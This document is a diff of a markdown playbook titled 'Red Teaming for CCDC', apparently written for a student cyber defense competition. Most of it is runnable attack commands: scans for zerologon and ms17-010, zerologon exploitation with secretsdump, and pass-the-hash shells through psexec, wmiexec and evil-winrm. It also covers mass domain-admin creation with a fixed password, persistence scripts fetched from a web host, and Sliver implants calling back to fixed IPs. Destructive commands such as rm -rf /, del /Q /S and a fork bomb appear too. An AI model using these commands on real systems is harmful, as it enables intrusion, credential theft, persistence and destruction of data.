@@ -7,27 +7,34 @@ pagetitle: Red Teaming for CCDC
 - Make sure to have a sheet with all host/shell info, so if we lose a shell we know where we lost it
 - Opening Salvo:
   - Quickly nmap scan for port 445, as this will almost always be our gateway in
-  - `nmap -sV -O -T4 -min-hostgroup 96 -p 445 --open {IP_range}`
+  - `sudo nmap -T4 -min-hostgroup 96 -p 53,445 --open {IP_range} | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > smb_ips.txt`
     - `-min-hostgroup` will divide the range up into 96 sup parts
+  - Then, check SMB IPs with `while read -r line; do nxc smb $line -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010; done < smb_ips.txt` 
+    - If we get a zerologon hit, run `zerologon.py` and then `impacket-secretsdump -just-dc -no-pass {domain}/{machine_name}:@{DC_IP}`
+      - e.g. `impacket-secretsdump -just-dc -no-pass 'corp.local/TEST-DC$@10.10.0.162'` (if DC name is TEST-DC)
   - Simultaneously run a scan for all port 22s (so we can use them when we find the default password)
-    - `nmap -sV -O -T4 -min-hostgroup 96 -p 22 {IP_range}`
-  - Additionally, one final `nmap -sn -T4 10.10.0.1/24 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ips.txt` to just figure out what hosts are online
-  - Then pass alive hosts to autorecon with `sudo autorecon -t ips.txt -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,636,873,993,995,1025-1030,1080,1433,1521,1723,3306,3389,5432,5900,5985,6379,6667,8000,8080,8443,8888 -o autorecon_results --max-scans 100`
-  - Then, run `while read -r line; do nxc smb $line -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010; done < ips.txt` against all IPs
-    - If we get a hit, run `zerologon.py` and then `impacket-secretsdump -just-dc-user {target_domain_user} {domain}/{admin_username}:"{password}"@{DC_IP}`
-      - e.g. `impacket-secretsdump -just-dc -no-pass 'corp.local/TEST-DC$@10.10.0.162'` (DC name is TEST-DC)
+    - `sudo nmap -sV -O -T4 -min-hostgroup 96 -p 22 {IP_range}`
+  - Additionally, one final `sudo nmap -sn -T4 {IP_range} | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -u > ips.txt` to just figure out what hosts are online
+    - Then pass alive hosts to autorecon with `sudo autorecon -t ips.txt -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,636,873,993,995,1025-1030,1080,1433,1521,1723,3306,3389,5432,5900,5985,6379,6667,8000,8080,8443,8888 -o autorecon_results --max-scans 100`
 
 - **Persistence:**
   - **Domain:**
-    - Run `mass_user_add_local.sh` with domain admin creds/hash against a DC to add a bunch of domain admins
-      - Pass is `IWinAgain123#`
+    - Run `mass_user_add.sh` with domain admin creds/hash against a DC to add a bunch of domain admins
+      - On Windows side, [add_domain_users.ps1](https://khaelkugler.com/scripts/add_domain_users.ps1)
     - Grab `krbtgt` (and other) hashes with `impacket-secretsdump -hashes :{hash} {domain}/{user}@{DC_IP}` 
       - Alternatively `impacket-secretsdump {domain}/{user}:'{password}'@{DC_IP}` with a password
   - **Windows:**
     - When installing the exes, make sure to use `-o` with `iwr` or we'll just get the HTTP connection info lmfao
-    - First, run `windows_add_payloads.ps1` to add the file to each of the locations
-    - Then, run `windows_persistence.ps1`
+    - First, run [windows_add_payloads.ps1](https://khaelkugler.com/scripts/windows_add_payloads.ps1) to add the file to each of the locations
+    - Then, run [windows_persistence.ps1](https://khaelkugler.com/scripts/windows_persistence.ps1)
+    - Shells:
+      - 135 - use `impacket-wmiexec -hashes :{hash} {domain}/{user}@{ip}`
+      - 445 - use `impacket-psexec -hashes :{hash} {domain}/{user}@{ip}`
+      - 5985 - use `evil-winrm -i {IP} -u {username} -H {hash} -r {domain}`
+        - `-r` optional, used for kerberos
   - **Linux:**
+    - Run [linux_persistence.sh {payload_name} {optional_absolute_path_to_payload}](https://khaelkugler.com/scripts/linux_persistence.sh) while hosting the payload
+      - Make sure to point the script to the correct location to pull the file from
     - Add SSH keys
       - `mkdir /root/.ssh` and add key to `/root/.ssh/authorized_keys`
     - Modify `/etc/passwd` and `/etc/ssh/sshd_config`
@@ -41,8 +48,6 @@ pagetitle: Red Teaming for CCDC
         - Has to start with a `#!/bin/bash`
 
 **AutoRecon**
-- Command to run at the start of competition: `sudo autorecon {IP_range} -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,636,873,993,995,1025-1030,1080,1433,1521,1723,3306,3389,5432,5900,5985,6379,6667,8000,8080,8443,8888 -o autorecon_results --max-scans 100 --heartbeat 30`
-  - If we want, we can `nmap -sn {IP_range}` and pass the alive hosts into `-t alive-hosts.txt`
 - Overall status: `find autorecon_results -name "*.txt" -type f -exec grep -l "open" {} \; | sort`
 - Common vulns: `grep -r "MS17-010\|CVE-\|Anonymous\|Password:" autorecon_results`
 - Anonymous access: `grep -r "Anonymous" autorecon_results`
@@ -60,8 +65,8 @@ pagetitle: Red Teaming for CCDC
   - Seems it doesn't mix well with Windows, unfortunately. Plan on mtls for windows, wg for linux.
 - Then, use `generate` to create implants or beacons
   - `generate --wg {our_IP} --os linux` for an implant
-  - `generate beacon --wg 10.10.0.171 -j {jitter} -S {wait_seconds} --os linux` 
-  - Windows: `generate --mtls 10.10.0.171 --os windows` 
+  - `generate beacon --wg 192.168.0.102 -j {jitter} -S {wait_seconds} --os linux` 
+  - Windows: `generate --mtls 192.168.0.102 --os windows` 
 - `sessions` to show active sessions
   - `sessions -i {id}` to interact with session
     - `CTRL + d` to exit
@@ -84,17 +89,21 @@ pagetitle: Red Teaming for CCDC
     - This is too kind, we shant do this :>
   - Edit service configs
   - Drop 50% of incoming firewall packets
-  - Reset default credentials
+  - `keyboard_desktop_flipper.sh`
+  - `service_stopper.sh`
+  - `command_rotate.sh`
 - Hard breaks:
   - Delete configs
   - Destructive firewall rules
   - Remove scoring assets
   - Delete entire binaries/files
+  - `ip_rotate.sh`
 - Nukes:
   - `rm -rf / -no-preserve-root`
   - `del /Q /S`
   - Fork bombing (`:(){ :|:& };:`)
-  - Corrupt bootloader partition (oh my god this is evil)
+  - `timebomb.sh`
+  - Corrupt bootloader partitions
 
 **Misc**
 - Windows:
@@ -106,6 +115,7 @@ pagetitle: Red Teaming for CCDC
 - Linux:
   - `reboot` to restart
   - `who` to see who's on a system
+    - `pkill -t {result}` to then kill their session
   - `pkill -KILL -u {user}` - kill all of a user's processes
   - `kill -9 {pid}` to kill a specific process
 - Machine IPs:
@@ -127,22 +137,10 @@ pagetitle: Red Teaming for CCDC
   - MongoDB: `mongodump --host [host] --port [port] --username [user] --password [password] --out ./mongodb_dump`
 
 **Trolling**
-- alias binaries :>
-  - `echo "alias cd='echo access denied'" >> ~/.bashrc`
 - wall
-  - `wall "System update: please wiggle your mouse to avoid data loss.`
-- login messages:
-  - `echo "WARNING: This system is monitored by a mildly annoyed squirrel." > /etc/motd`
-- Make all files immutable:
-  - `find . -type f -exec chattr +i {} +`
+  - `wall "dance.`
 - Set all computers to same background:
   - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
-
-**Todo:**
-- Improve domain persistence (not just adding a bunch of users and grabbing krbtgt)
-
-**Unimplemented Ideas:**
-- None rn
 
 **Defender/AppArmor/SELinux**
 - Defender:
